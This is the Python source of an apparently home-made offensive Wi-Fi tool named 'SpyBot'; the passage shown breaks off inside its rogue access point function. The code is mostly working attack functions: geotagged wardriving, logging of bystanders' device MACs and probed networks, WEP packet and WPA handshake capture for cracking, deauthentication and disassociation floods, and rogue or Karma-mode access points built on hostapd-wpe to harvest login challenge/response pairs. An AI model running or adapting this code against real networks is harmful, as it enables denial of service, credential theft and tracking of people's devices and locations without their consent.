#!/usr/bin/python
import sys,os,threading,time,multiprocessing,sqlite3,subprocess,pygmaps,click
from scapy.all import *
from gpstest import gpsd
from locationtest import gmaps
####Global Variable Declaration Section
inter=sys.argv[1]
aplist=set()
ssid=set()
addrset=set()
CommitHandler=False
probeset=set()
setinter='mon0'
# secinter='sinter'
hiddenapset=set()
hidden=set()
###############Defination Declaration Sections##########################
def init_db():                                               #####CONFIGURATION DECLARATION
    try:
        con1=sqlite3.connect('spybot.db')
        print "[*] Connection Established to SpyBot Database"
        return con1
    except:
        print "Cannot Connect to data base!"
        return

def insertintodbnetworks(ap,type):
    try:
        if type==1:
            value="ProbeResp"
        else: value="Beacon"
        timestamp=subprocess.check_output(["date"]).strip()
        query="insert into networks(timestamp,type,SSID,BSSID,channel,encryption,signal,wps,coordinates,location) values(?,?,?,?,?,?,?,?,?,?)"
        connection.execute(query,(timestamp,value,ap.name,ap.addr,ap.channel,ap.enc,ap.signal,ap.wps,ap.coordinates,ap.location))

    except:
        print "Cannot Store entries to Networks DB!"
        return
def insertintodbclientprobes(coordinates,location,singleprobe):
    try:
        [client,ssid]=singleprobe.split('---')
        timestamp=subprocess.check_output(["date"]).strip()
        query="insert into clientprobes(timestamp,devicemac,probe,coordinates,location) values(?,?,?,?,?)"
        connection.execute(query,(timestamp,client,ssid,coordinates,location))

    except:
        print "Cannot Store entries to clientprobes DB!"
        return
###############################INTERFACE RELATED FUNCTIONS###################################
def init_interface():                                                #####CONFIGURATION DECLARATION
    print "[*] Initializing Interface: %s!"%inter
    cmd1="ifconfig %s down"%inter
    cmd2="iwconfig %s mode monitor"%inter
    #cmd3="iw dev %s set monitor none"%inter
    cmd4="iw dev %s interface add mon0 type monitor"%inter
    cmd5="ifconfig %s up"%setinter
    for cmd in cmd1,cmd2,cmd4,cmd5:
        os.system(cmd)
        time.sleep(1.5)
    return
def reset_interface():
    print "[*] Resetting Interface: %s !"%inter
    cmd="ifconfig %s down"%inter
    cmd1="iw dev mon0 del"
    cmd2="iwconfig %s mode managed"%inter
    cmd3="ifconfig %s up"%inter
    for cmd in [cmd1,cmd2,cmd3]:
        os.system(cmd)
        time.sleep(0.5)
    print "[*] Interface has been reset!"
def set_channel(ch,intf):
    print "[*] Setting Channel %d on %s.."%(ch,intf)
    cmd="iwconfig %s ch %d"%(intf,ch)
    os.system(cmd)
    time.sleep(0.5)
    print "[*] Channel %d Set on %s interface"%(ch,intf)
    return

def channel_hopper(setinter):                                               #####CONFIGURATION DECLARATION
    try:
        while True:
            for ch in range(1,12):
                cmd="iwconfig %s ch %d"%(setinter,ch)
                os.system(cmd)
                time.sleep(0.1)
    except KeyboardInterrupt:
        print "hopper interrupted"
        #return
############################NETWORK SCANNER RELATED DECLARATIONS##################################

class AccessPoint:                              #####CLASS FOR 'AccessPoint' OBJECTS
    def __init__(self):
        self.name=''
        self.addr=''
        self.channel=0
        self.enc=''
        self.signal=0
        self.wps=''
        self.coordinates=''
        self.location='xx'
    def show(self):
        return "%s\t %s\t %s\t %s\t    %s\t     %s\t     %s\t\t  %s\t "%(self.addr,self.channel,self.enc,self.signal,self.wps,self.coordinates,self.name,self.location)

def get_coordinates():                                           ####NetworkScanner Defination 1
    try:
        lat=gpsd.fix.latitude
        lon=gpsd.fix.longitude
        line="%s,%s"%(lat,lon)
        return line
    except:
        line="0.0,0.0"
        return line ##unable to retrieve gps values
def get_map():
    global aplist
    mymap=pygmaps.maps(gpsd.fix.latitude,gpsd.fix.longitude,12)
    for ap in aplist:
        lat,lon=ap.coordinates.split(',')
        lat=float(lat)
        lon=float(lon)
        sig=str(ap.signal)
        point=str(ap.name)+" "+str(ap.addr)+" signal:"+sig
        mymap.addpoint(lat,lon,"#0000FF",point)
        time.sleep(0.5)
    print "Creating map.."
    tim=subprocess.check_output(['date'])
    filelocation="./Maps/"+tim.strip()
    mymap.draw(filelocation) #Note can merge with existing maps
    print "[*] Done. Created Map File:%s \n"%(filelocation)
def get_location(coordinates):                                  ####NetworkScanner Defination 3
    # try:
        lat,lon=coordinates.split(',')
        lat=float(lat)
        lon=float(lon)
        data=gmaps.reverse_geocode((lat,lon))
        d=data[1]
        d=d['address_components']
        d=d[0]
        value=d['long_name']
        value=value[0:30]
        return value
    # except:
        # return "unknown" ####cannot retieve location

def eltparser(pkt):                                            ####NetworkScanner Defination 4
    try:
        wps=''
        crypto=set()
        temp=pkt
        cap=temp.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}""{Dot11ProbeResp:%Dot11ProbeResp%}").split('+')
        WPS_ID="\x00\x50\xF2\x04"
        iswps=False
        while pkt.haslayer(Dot11Elt):
            pkt=pkt.getlayer(Dot11Elt)
            if pkt.ID==3:
                channel=ord(pkt.info)
            elif pkt.ID==221 and pkt.info.startswith(WPS_ID):
                iswps=True
            elif pkt.ID==221 and pkt.info.startswith('\x00P\xf2\x01\x01\x00'):
                crypto.add("WPA")
            elif pkt.ID==48:
                crypto.add("WPA2")
            else: pass
            pkt=pkt.payload
        if not crypto:
            if 'privacy' in cap:
                crypto.add("WEP")
            else:
                crypto.add("OPN")
        enc=crypto.pop()
        if iswps:
            wps='yes'
        else:wps='no'
        return channel,enc,wps

    except:
        enc='unknown'
        channel=0
        iswps='unknown'
        return channel,enc,wps

def probe_packethandler(pkt):
    global probeset
    if pkt.haslayer(Dot11ProbeReq):
        if len(pkt.info)>0: # To avoid null SSID based probe requests
            probe=pkt.addr2 + "---" + pkt.info
            if probe not in probeset:
                probeset.add(probe)
                coords=get_coordinates()
                loc=get_location(coords)
                insertintodbclientprobes(coords,loc,probe)
                #print "New Client Probe found: Client %s is looking for SSID %s"%(pkt.addr2,pkt.info)
                print "\n --------------------Client Probes Table-------------------------------"
                print "\n --Number-------Client MAC---------searching for-------ESSID-----------"
                counter=0
                for probe in probeset:
                    [client,ssid]=probe.split('---')
                    counter+=1
                    print "     %d       %s \t\t\t       %s"%(counter,client.upper(),ssid)

                print "\n ----------------------------------------------------------------------"

def net_packethandler(pkt):                                         ####NetworkScanner Defination 6
    global aplist
    typ=1
    if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
        if pkt.haslayer(Dot11Beacon):
            typ=0
            if not pkt.info :
                if pkt.addr3 not in hiddenapset:
                    hiddenapset.add(pkt.addr3)
                    ap=AccessPoint()
                    ap.name='<hidden>'
                    ap.addr=pkt.addr3
                    ap.signal=-(256-ord(pkt.notdecoded[-2:-1]))
                    ap.channel,ap.enc,ap.wps=eltparser(pkt)
                    ap.coordinates=get_coordinates()
                    ap.location=get_location(ap.coordinates)
                    ssid.add(ap.name)
                    addrset.add(ap.addr)
                    aplist.add(ap)
                    CommitHandler=True #DBMARKER-insert a insertintodb function line here
                    insertintodbnetworks(ap,typ)

        elif pkt.haslayer(Dot11ProbeResp) and (pkt.addr3 in hiddenapset):
        #print "Hidden SSID Uncovered! %s -- %s"% (pkt.info,pkt.addr3)
            for ap in aplist:
                if ap.addr==pkt.addr3:
                    ap.name=pkt.info
        if (pkt.info not in ssid) and (pkt.addr3 not in addrset):
        #Condition1 Checking for new access points
            ap=AccessPoint()
            ap.name=pkt.info
            ap.addr=pkt.addr3
            ap.signal=-(256-ord(pkt.notdecoded[-2:-1]))
            ap.channel,ap.enc,ap.wps=eltparser(pkt)
            ap.coordinates=get_coordinates()
            ap.location=get_location(ap.coordinates)
            ssid.add(ap.name)
            addrset.add(ap.addr)
            aplist.add(ap)
            CommitHandler=True #DBMARKER-insert a insertintodb function line here
            insertintodbnetworks(ap,typ)
        elif (pkt.info in ssid) and (pkt.addr3 in addrset):
        #Condition2 Update attibutes of the AccessPoint
            for ap in aplist:
                if (ap.name==pkt.info) and (ap.addr==pkt.addr3):
                    signal=-(256-ord(pkt.notdecoded[-2:-1]))
                    result=abs(ap.signal)-abs(signal)
                    ap.coordinates=get_coordinates()
                    ap.location=get_location(ap.coordinates)
                    if abs(result)>10:
                        ap.signal=signal
                        CommitHandler=True #DBMARKER-insert a insertintodb function
                        insertintodbnetworks(ap,typ)
        elif (pkt.info not in ssid) and (pkt.addr3 in addrset):
        #Condition3 When an AccessPoint changes name
            for ap in aplist:
                if (ap.addr==pkt.addr3) and (ap.name!=pkt.info):
                    if not pkt.info: ap.name='<--hidden-->'
                    else:
                        ap.name=pkt.info
                    ap.signal=-(256-ord(pkt.notdecoded[-2:-1]))
                    ap.coordinates=get_coordinates()
                    ap.location=get_location(ap.coordinates)
                    CommitHandler=True #DBMARKER-insert a insertintodb function
                    insertintodbnetworks(ap,typ)
        elif (pkt.info in ssid) and (pkt.addr3 not in addrset):
                    ap1=AccessPoint()
                    ap1.name=pkt.info.strip()
                    ap1.addr=pkt.addr3
                    ap1.signal=-(256-ord(pkt.notdecoded[-2:-1])) # use -(256-ord(pkt.notdecoded[-2:-1])) for tp, -4:-3 for alpha
                    ap1.channel,ap1.enc,ap1.wps=eltparser(pkt)
                    ap1.coordinates=get_coordinates()
                    ap1.location=get_location(ap1.coordinates)
                    addrset.add(ap1.addr)
                    aplist.add(ap1)
                    CommitHandler=True #DBMARKER-insert a insertintodb function line here
                    insertintodbnetworks(ap1,typ)
        else: pass

        if len(aplist)>0:
            count=1
            print "\n"
            print "----------------------------------------------------------NETWORKS------------------------------------------------------------"
            print "------BSSID----------Channel------ENC-----SIGNAL----WPS-------------COOORDINATES----------------SSID------------LOCATION------"
            for ap in aplist:
                line=ap.show()
                cmd="%d "%(count)+line
                print cmd
                count+=1
##################packethandler Ends Here######################################
def make_map():
    ch=raw_input("Do you want to map the access points?[yes/y]")
    if ch.strip() in ['yes','y','\n']:
        # for i in aplist:  #For testing only
        #     cmd=i.show()
        #     print cmd
        get_map()
    else: print "Bubye!"
    return

def network_scanner():
    global aplist
    global connection
    aplist.clear()
    print "[*] Creating Access Point List Buffer"
    print "[*] Starting Channel Hopper on %s!"%setinter                               ####SBYBOT FUNCTION 1
    print "[*] Searching for Networks....."
    hopper_thread=multiprocessing.Process(target=channel_hopper,args=(setinter,))
    hopper_thread.start()
    sniff(prn=net_packethandler,iface=setinter,store=0)
    print "\n[*] You Stopped Sniffing! Press Enter!\n"
    hopper_thread.terminate()
    hopper_thread.join()
    raw_input()
    connection.commit()
    return

def clientprobe_scanner():
    global probeset
    print "[*] Waiting for Client Request Probes....."
    print "[*] Starting Channel Hopper on %s!"%setinter
    hopper_thread=multiprocessing.Process(target=channel_hopper,args=(setinter,))
    hopper_thread.start()
    sniff(prn=probe_packethandler,iface=setinter,store=0)
    print "\nYou Stopped Sniffing! Press Enter!\n"
    hopper_thread.terminate()
    hopper_thread.join()
    raw_input()
    print "[*] Probes saved to SPYBOT DATABASE. Returning to Main Menu!"
    counter=0
    for probe in probeset:
        [client,ssid]=probe.split('---')
        counter+=1
        print "     %d       %s \t\t\t       %s"%(counter,client.upper(),ssid)

def hidden_packethandler(pkt):
    global hidden
    if pkt.haslayer(Dot11Beacon):
        if not pkt.info :
            if pkt.addr3 not in hidden:
                hidden.add(pkt.addr3)
                print "Hidden SSID network found: %s"% (pkt.addr3)
    elif pkt.haslayer(Dot11ProbeResp) and (pkt.addr3 in hidden):
        print "Hidden SSID Uncovered! %s -- %s"% (pkt.info,pkt.addr3)

def hiddenap_scanner():

    print "[*] Starting Channel Hopper on %s!"%setinter
    print "[*] Searching for Hidden Networks....."
    hopper_thread=multiprocessing.Process(target=channel_hopper,args=(setinter,))
    hopper_thread.start()
    sniff(prn=hidden_packethandler,iface=setinter,store=0)
    print "\nYou Stopped Sniffing! Press Enter!\n"
    hopper_thread.terminate()
    hopper_thread.join()
    raw_input()
    print "[*] Exiting Hidden APs Finder!"
    return

def wep_packet_capture():
    try:
	global dcnt
        dcnt=1
        def wep_packet_handler(pkt):
	    global dcnt
            print "[*] Data packet from AP: %s"%wepad
            if pkt.haslayer(Dot11) and pkt.type == 2 and (pkt.addr1 ==wepad or pkt.addr2 == wepad or pkt.addr3== wepad) and pkt.haslayer(Dot11WEP):
                dcnt=dcnt+1
                print "[*] %d Data Packets captured"%dcnt

        global aplist
        print "[*] Do you want to: [1]-Run a New Scan. [2]-Use Previous Scan Results.\n"
        # print "[*] [1]-Run a New Scan. [2]-Use Previous Scan Results.\n "
        while True:
            # raw_input()
            print "[*] Enter a choice [1]/[2]:"
            choice=click.getchar()
            if choice not in ['1','2']:
                print "[*] Invalid Choice! Enter a Valid Option or Ctl C to Goto Main Menu !"
                continue
            elif choice in ['1','2']:
                break
        if choice=='1':
            network_scanner()
        else:
            print "[*] Displaying Previous Scan Results"
        count=1
        print "----------------------------------------------------------NETWORKS------------------------------------------------------------"
        print "------BSSID----------Channel------ENC-----SIGNAL----WPS-------------COOORDINATES----------------SSID------------LOCATION------"
        for ap in aplist:
            line=ap.show()
            cmd="%d "%(count)+line
            print cmd
            count+=1
        while True:
            print "[*] Enter a network [num]:"
            choice=int(click.getchar())

            if choice>0 and choice<=len(aplist):
                choice=choice-1
                print "[*] Network %d selected!"%(choice+1)
                alist=list(aplist)
                if alist[choice].enc!='WEP':
                    print "[*] Selected Network is not a WEP Network!"
                    continue
                else:
                    wepap=alist[choice]
                    print "[*] %s Network on channel %d Selected"%(wepap.name,wepap.channel)
                    break
            else:
                print "[*] Invalid Choice! Enter again!"
                continue
        set_channel(int(wepap.channel),setinter)
        print "[*] Creating Sniffer Filter ...."
        wepad=wepap.addr
        fil=lambda x,addr=wepad : x.haslayer(Dot11) and x.type==2 and (x.addr3==addr or x.addr2==addr or x.addr1 == addr) and x.haslayer(Dot11WEP)
        print "[*] Sniffing for packets...."
        while True:
            pkts=sniff(iface=setinter,lfilter=fil,prn=wep_packet_handler)
            print "\nYou Stopped Sniffing! Press Enter!\n"
            raw_input()
            print "[*] Press [1] to continue Sniffing for data packets. Press any other key to continue"
            ch=click.getchar()
            if ch=='1':
                continue
            else: break
        path=os.getcwd()
        path+='/Captures/wep_data'
        print "[*] Writing captured data packets!"
        wrpcap("./Captures/wep_data",pkts,append=True)
        print "[*] Captured data packets at:%s "%path
        print "[*] Returning to SpyBot Main Menu! Choose option 9 to connect to SpyBot C2C to retrieve Captures! Press Enter"
        raw_input()
        return
    except KeyboardInterrupt:
        print "[*] Exiting WEP ATTACK Function."
        print "[*] Returning to SpyBot Main Menu ..."
        return
def wpa_handshake_capture():
    try:
        def wpa_pkt_handler(pkt):
            temp=pkt.getlayer(Dot11)
            if pkt.haslayer(EAPOL):
                print "[*]|| EAPOL PACKET SNIFFED ||"
                pkt=pkt.getlayer(EAPOL)
                if pkt.type==3:
                    print "[*]|| EAPOL PACKET SNIFFED || Source: %s -----> Destination: %s ||"%(temp.addr2,temp.addr1)

        print "[*] Caution: Handshake Auto Detection Not Supported!"
        print "[*] Manually observe a 4 Way Handshake..wait for atleast 4 to 6 EAPOL frame exchanges.."
        print "[*] Press CTL+C To stop Sniffing. Press Enter To Begin."
        raw_input()
        print "[*] Starting Channel Hopper on %s!"%setinter
        hopper_thread=multiprocessing.Process(target=channel_hopper,args=(setinter,))
        hopper_thread.start()
        while True:
            print "[*] Starting sniffing for EAPOL Frames...!"
            pkts=sniff(iface=setinter,prn=wpa_pkt_handler)
            print "\n[*] You Stopped Sniffing! Press Enter!\n"
            wrpcap("./Captures/wpa_cap",pkts,append=True)
            raw_input()
            # while True:
            print "[*] Do You Want to Verify Handshake Capture?[y]/[n]"
            ch=click.getchar()
            if ch in ['y','yes','\n']:
                hopper_thread.terminate()
                hopper_thread.join()
                # wrpcap("./Captures/wpa_cap",pkts)
                handle=subprocess.Popen(['aircrack-ng ./Captures/wpa_cap'],shell=True,stdin=None,stdout=None,stderr=None)
                handle.communicate()
                print "[*] Do You Want to Sniff For Handshakes Again?[y]/[n]"
                ch=click.getchar()
                if ch in ['y','yes','\n']:
                    hopper_thread=multiprocessing.Process(target=channel_hopper,args=(setinter,))
                    hopper_thread.start()
                    continue
                else: break
            else:
                hopper_thread.terminate()
                hopper_thread.join()
                print "[*] Creating Capture File..."
                path=os.getcwd()
                path=path+"/Captures/wpa_cap"
                wrpcap("./Captures/wpa_cap",pkts,append=True)
                print "[*] Capture Saved at: %s"%(path)
                break
        print "[*] Stopping Channel Hopper."

        print "[*] Exiting WPA Handshake Capture. Returning to SpyBot Main Menu.Press Enter!"
        raw_input()
        return
    except KeyboardInterrupt:
        hopper_thread.terminate()
        hopper_thread.join()
        print "[*] Exiting WPA Handshake Capture."
        print "[*] Returning to SpyBot Main Menu ..."
        return
    except:
        hopper_thread.terminate()
        hopper_thread.join()
        print "[*] Exiting WPA Handshake Capture."
        print "[*] Returning to SpyBot Main Menu ..."
        return
def deauth_launcher():
    global aplist
    deauth=1 # default use deauthentication packets
    clientset=set()
    global start
    def client_sniffer(pkt):
        if pkt.haslayer(Dot11) and not pkt.haslayer(Dot11Beacon):
            if pkt.addr3 == deauthap.addr:
                # if pkt.addr2==pkt.addr3:
                clientset.add(pkt.addr1)
                # if pkt.addr1==pkt.addr3:
                clientset.add(pkt.addr2)
                for client in clientset:
                    print "[*] ||CLIENT|| Client %s connected AP MAC: %s "%(client, pkt.addr3)
    def deauth_hopper(deauth,deauthset,deauthap):
        global start
        try:
            # global setinter
            if start==0:
                return
            if start==1:
                #in thread mode
                # while True:
                    #print "in thread"
                    if deauth==1: # create only deauth packets
                        while True:
                            for target in deauthset:
                                sender= deauthap.addr
                                receiver= target
                                pkt=RadioTap()/Dot11( addr1=receiver,addr2=sender,addr3=sender)/Dot11Deauth()
                                sendp(pkt,iface=setinter,count=30,inter=0.4,verbose=0)
                                pkt=RadioTap()/Dot11( addr1=sender,addr2=receiver,addr3=sender)/Dot11Deauth()
                                sendp(pkt,iface=setinter,count=30,inter=0.4,verbose=0)
                                time.sleep(0.5)
                    elif deauth==0:
                        while True:
                            for target in deauthset:
                                sender= deauthap.addr
                                receiver= target
                                pkt=RadioTap()/Dot11( addr1=receiver,addr2=sender,addr3=sender)/Dot11Disas()
                                sendp(pkt,iface=setinter,count=30,inter=0.4,verbose=0)
                                pkt=RadioTap()/Dot11( addr1=sender,addr2=receiver,addr3=sender)/Dot11Disas()
                                sendp(pkt,iface=setinter,count=30,inter=0.4,verbose=0)
                                time.sleep(0.5)

                #if deauth==0:
            if start==2:
                if deauth==1: # create only deauth packets
                    while True:
                        for target in deauthset:
                            sender= deauthap.addr
                            receiver= target
                            print"[*] Sending Deauth from %s to %s"%(sender, receiver)
                            pkt=RadioTap()/Dot11( addr1=receiver,addr2=sender,addr3=sender)/Dot11Deauth()
                            sendp(pkt,iface=setinter,count=30,inter=0.4,verbose=1)
                            print"[*] Sending Deauth from %s to %s"%(receiver, sender)
                            pkt=RadioTap()/Dot11( addr1=sender,addr2=receiver,addr3=sender)/Dot11Deauth()
                            sendp(pkt,iface=setinter,count=30,inter=0.4,verbose=1)
                elif deauth==0:
                    while True:
                        for target in deauthset:
                            sender= deauthap.addr
                            receiver= target
                            print"[*] Sending Disassosiacation packets from %s to %s"%(sender, receiver)
                            pkt=RadioTap()/Dot11( addr1=receiver,addr2=sender,addr3=sender)/Dot11Disas()
                            sendp(pkt,iface=setinter,count=30,inter=0.4,verbose=1)
                            print"[*] Sending Disassosiacation packets from %s to %s"%(receiver, sender)
                            pkt=RadioTap()/Dot11( addr1=sender,addr2=receiver,addr3=sender)/Dot11Disas()
                            sendp(pkt,iface=setinter,count=30,inter=0.4,verbose=1)
        except KeyboardInterrupt:
            print "Deauth Stopped!"
            return
    try:
        while True: #checked
                print "[*] Deauthentication Attack Launcher: Select mode of attack:\n[1] Using Deauthentication Packets. [2] Using Disassosiacation Packets."
                ch=click.getchar()
                clientset.clear()
                if ch in ['1','2']: #checked
                    if ch==1: #checked
                        deauth=1
                        print "[*] MODE SET: Deauthentication Packets "
                    if ch==2: #checked
                        deauth=0
                        print "[*] MODE SET: Disassosiation Packets "
                    print "[*] Do you want to: [1]-Run a New Scan. [2]-Use Previous Scan Results.\n"
                    while True: #checked
                        print "[*] Enter a choice [1]/[2]:"
                        choice=click.getchar()
                        if choice not in ['1','2']: #checked
                            print "[*] Invalid Choice! Enter a Valid Option or Ctl C to Goto Main Menu !"
                            continue
                        elif choice in ['1','2']: #checked
                            break
                    if choice=='1': #checked
                        network_scanner()
                    else: #checked
                        print "[*] Displaying Previous Scan Results"
                    count=1
                    print "----------------------------------------------------------NETWORKS------------------------------------------------------------"
                    print "------BSSID----------Channel------ENC-----SIGNAL----WPS-------------COOORDINATES----------------SSID------------LOCATION------"
                    for ap in aplist: #displays network list, checked
                        line=ap.show()
                        cmd="%d "%(count)+line
                        print cmd
                        count+=1
                    while True: # loop for selecting an AP object
                        print "[*] Enter the Access Point Number to perform Deauth attacks[num]:"
                        choice=int(click.getchar())

                        if choice>0 and choice<=len(aplist):
                            choice=choice-1
                            print "[*] Network %d selected!"%(choice+1)
                            alist=list(aplist)
                            deauthap=alist[choice]
                            break
                        else:
                            print "[*] Invalid Choice! Enter again!"
                            continue
                    print "[*] Access Point Name: %s "%(deauthap.name)
                    while True:
                        print "[*] Do you want to deauth [1] All the Clients or [2] Select Clients to Deauth (better than airreplay here!)"
                        choice=click.getchar()
                        if choice not in ['1','2']:
                            print "[*] Invalid Choice! Enter a Valid Option or Ctl C to Goto Main Menu !"
                            continue
                        else:
                            break
                    if choice=='1': #Prepares broadcast deauth set
                        brdmac="ff:ff:ff:ff:ff:ff"
                        clientset.add(brdmac)
                        deauthset=clientset
                        print "[*] Will be Deauthenticating all the connected clients!"
                        print "[*] Deauth set prepared !"
                    else: #Prepares Selected Client Deauthset
                        #fil=lambda x,addr=deauthap.addr : x.haslayer(Dot11) and x.addr3==addr and x.addr
                        try:##sniffs for clients to prepare slected client deauthset

                            print "[*] Starting Client Sniffer for %s: %s"%(deauthap.name,deauthap.addr)
                            print "[*] Press CTL+C to stop!"
                            hopper_thread=multiprocessing.Process(target=channel_hopper,args=(setinter,))
                            hopper_thread.start()
                            sniff(iface=setinter,prn=client_sniffer)
                            hopper_thread.terminate()
                            hopper_thread.join()
                            print "\n[*] You Stopped Sniffing! Press Enter!\n"
                            raw_input()
                            print "[*] Client set prepared !"
                            deauthset=set()
                            clientlist=list(clientset)
                            print "[*] Displaying Connected Client List for %s"
                            cnt=1
                            print "---Number-----------Connected-Client---------"
                            for client in clientset: #Displays all clients in clientset
                                print "   %d\t\t %s"%(cnt,client)
                                cnt=cnt+1
                            while True:
                                print "[*] Enter a Client to select [num]:"
                                choice=int(click.getchar())

                                if choice>0 and choice<=len(clientlist):
                                    choice=choice-1
                                    print "[*] Client %d selected!"%(choice+1)
                                    deauthset.add(clientlist[choice])
                                    while True:
                                        print "[*] Do you want to enter another client? [y]/[n]"
                                        ch=click.getchar()
                                        if ch not in ['y','n']:
                                            print "[*] Invalid choice!"
                                            continue
                                        else:
                                            break
                                    if ch=='y':
                                        continue
                                    else:
                                        break
                                else: #checked
                                    print "[*] Invalid choice!"
                                    continue
                            print "[*] Deauthset prepared!"

                        except:
                            print "[*] exception occured while sniffing! Stopping channel hopper thread."
                            hopper_thread.terminate()
                            hopper_thread.join()

                    while True:
                        print "[*] Do you want to start handshake capture while the deauth runs in background? [y]/[n]"
                        ch=click.getchar()
                        if ch not in ['y','n']:
                            print "[*] Invalid choice! "
                            continue
                        elif ch == 'y':
                            try:
                                start=1 #Start in Threaded Mode
                                deauth_thread=deauth_thread=multiprocessing.Process(target=deauth_hopper,args=(deauth,deauthset,deauthap))
                                deauth_thread.start()
                                wpa_handshake_capture()
                                start=0 #Stop Deauth
                                deauth_thread.terminate()
                                deauth_thread.join()
                                print "[*] Deauthentication Stopped!"
                                raw_input()
                                break
                            except:
                                break
                                start=0
                                deauth_thread.terminate()
                                deauth_thread.join()
                                print "Exception in handshake Capturing Deauth!"
                        elif ch =='n':
                            try:
                                start=2 #Start in Unthreaded Mode
                                print "[*] Starting Channel Hopper!"
                                hopper_thread=multiprocessing.Process(target=channel_hopper,args=(setinter,))
                                hopper_thread.start()
                                print "[*] Starting Deauthentication Attack!"
                                deauth_hopper(deauth,deauthset,deauthap)
                                start=0
                                hopper_thread.terminate()
                                hopper_thread.join()
                                print "[*] Deauthentication Stopped! Press Enter"
                                raw_input()
                                break
                            except:
                                break
                                hopper_thread.terminate()
                                hopper_thread.join()
                    print "[*] Enter y to perform deauth again!"
                    ch=click.getchar()
                    if ch == 'y':
                        continue
                    else:
                        print "[*] Exiting Deauthentication Launcher.."
                        return

                else:
                    print "[*] Enter a valid option or press CTL+C to return to SpyBot Main Menu"
                    continue
    except KeyboardInterrupt:
        print "[*] You pressed CTL+C. Returning to SpyBot Main Menu"
        return

def rogue_AP_launcher():

    def check():

        time.sleep(2)
        while True:
            print "\n\n[*] Any challenge/response pairs received?[y/n]"
            ch=click.getchar()
            if ch not in ['y','n']:
                print "[*] Invalid option! Try again"
                continue
            else: break
        if ch=='y':
            print "[*] Check log file: Rogue_AP_log.txt in Captures folder!"

        else:
            print "[*] Wait for users to connect ! Exiting!"
        return

    def create_rogue(name,channel,enc):
        cmd="wpa_cli -i %s terminate"%(secinter)
        # cmd="nmcli r wifi off "
        # cmd="wpa_cli %s"
        # cmd="nmcli nm wifi off"
        os.system(cmd)
        # os.system("rfkill unblock wlan")
        time.sleep(2)
        os.chdir("./Rogue_Files/hostapd-2.6/hostapd")
        s=os.getcwd()
        print "[*] Current Working Directory changed to %s"%(s)

        if name!="karma_mode_dev":
            if enc=='OPN':
                template="./template_open.conf"
            elif enc=="WPA2":
                template="./template_enterprise.conf"
            fd=open(template,"r")
            data=fd.readlines()
            fd.close()
            data[0]="interface=%s\n"%(secinter)
            data[1]="ssid=%s\n"%(name)
            data[2]="channel=%s\n"%(str(channel))
            fd=open(template,"w")
            fd.writelines(data)
            fd.close()
            try:
                print "[*] Starting Rogue AP"
                cmd="./hostapd-wpe %s"%(template)
                hn=subprocess.Popen([cmd],shell=True,stdin=subprocess.PIPE,stdout=None,stderr=None)
                hn.communicate()
            except KeyboardInterrupt:
                check()

        else:
            print "[*] Operating in Karma mode! Hostapdwpe will work in karma mode"
            template="./template_open.conf"
            cmd="./hostapd-wpe -k %s"%(template)
            try:
                print "[*] Starting Rogue AP"
                hn=subprocess.Popen([cmd],shell=True,stdin=subprocess.PIPE,stdout=None,stderr=None)
                hn.communicate()
            except KeyboardInterrupt:
                check()

        os.chdir("../../../")
        s=os.getcwd()
        print "[*] Current Working Directory changed to %s"%(s)
        cmd="cp ./Rogue_Files/hostapd-2.6/hostapd/hostapd-wpe.log ./Captures/Rogue_AP_log.log"
        os.system(cmd)
        print "[*] Log stored in Captures Folder!"
        return



    try:
        # secinter=''
        global aplist
        rap_name=''
        rap_channel=1
        rap_enc=''
        print "[*] Rogue AP Launcher."
        print "[*] CAUTION: You must have a compatible wireless card that supports AP mode for this.\n[*] This attack will not work without a compatible wireless adapter!"
        print "[*] If not sure, run \"iw dev <interface_name> info\" and \"iwconfig\" to get interface information"
        print "[*] Press Enter to continue or CTL+C to return to main menu!"
        raw_input()
        print "[*] Enter the interface name"
        secinter=raw_input()
        secinter=secinter.strip()
        while True:
            print "[*] Select an option:"
            print "[*] 1. Create your own access point: You can specify an Access Point Name, Channel and Encryption (OPEN/802.1X)"
            print "[*] 2. Dynamically Create an Access Point: Auto selects the best signal based Access Point."
            print "[*] 3. Run a live scan or use existing scan results to choose a rogue AP to host!"
            print "[*] 4. Host rogue AP based on Karma mode! Only specify the encryption to be used.\n[*] In karma mode, Victims will see hotspots based on thier probe requests."
            ch=click.getchar()
            if ch not in ['1','2','3','4']:
                print "[*] Enter a valid option!"
                continue
            else: break
        if ch=='1':

            print "[*] Enter the name of the rogue AP:"
            rap_name=raw_input().strip()
            print "[*] Enter the channel number of the rogue AP:"
            rap_channel=int(raw_input())
            print "[*] Select the encryption to be used: [1] OPEN [2] WPA2-Enterprise"
            while True:
                enc=click.getchar()
                if enc not in ['1','2']:
                    print "[*] Enter a valid numeric option!"
                    continue
                else:
                    if enc=='1':
                        rap_enc='OPN'
                    else: rap_enc='WPA2'
                    break
            print "[*] Rogue AP Name, Channel and Encryption Set!"
            create_rogue(rap_name,rap_channel,rap_enc)
        elif ch=='2':
            print "[*] Press CTL+C to stop searching for networks!"
            network_scanner()
            print "[*] Network Scanning Done!"
            print "[*] Sorting out APLIST"
            sortap=list(aplist)
            sortap=sorted(sortap, key=lambda x:x.signal,reverse=True)
            print "[*] Choosing Access Point!"
            rap_channel=sortap[0].channel
            rap_name=sortap[0].name
            if sortap[0].enc=='OPN':
                rap_enc='OPN'
            else:
                rap_enc='WPA2'
            print "[*] Access point %s Chosen!"%(rap_name)
            create_rogue(rap_name,rap_channel,rap_enc)
        elif ch=='3':
            print "[*] Do you want to: [1]-Run a New Scan. [2]-Use Previous Scan Results.\n"
            # print "[*] [1]-Run a New Scan. [2]-Use Previous Scan Results.\n "
            while True:
                # raw_input()
                print "[*] Enter a choice [1]/[2]:"
                choice=click.getchar()
                if choice not in ['1','2']:
                    print "[*] Invalid Choice! Enter a Valid Option or Ctl C to Goto Main Menu !"
                    continue
                elif choice in ['1','2']:
                    break
            if choice=='1':
                network_scanner()
            else:
                print "[*] Displaying Previous Scan Results"
            count=1
            print "----------------------------------------------------------NETWORKS------------------------------------------------------------"
            print "------BSSID----------Channel------ENC-----SIGNAL----WPS-------------COOORDINATES----------------SSID------------LOCATION------"
            for ap in aplist:
                line=ap.show()
                cmd="%d "%(count)+line
                print cmd
                count+=1
            while True:
                print "[*] Enter a network [num]:"
                choice=int(click.getchar())

                if choice>0 and choice<=len(aplist):
                    choice=choice-1
                    print "[*] Network %d selected!"%(choice+1)
                    alist=list(aplist)
                    rap_name=alist[choice].name
                    rap_channel=alist[choice].channel
                    rap_enc=alist[choice].enc
                    break
                else:
                    print "[*] Invalid Choice! Enter again!"
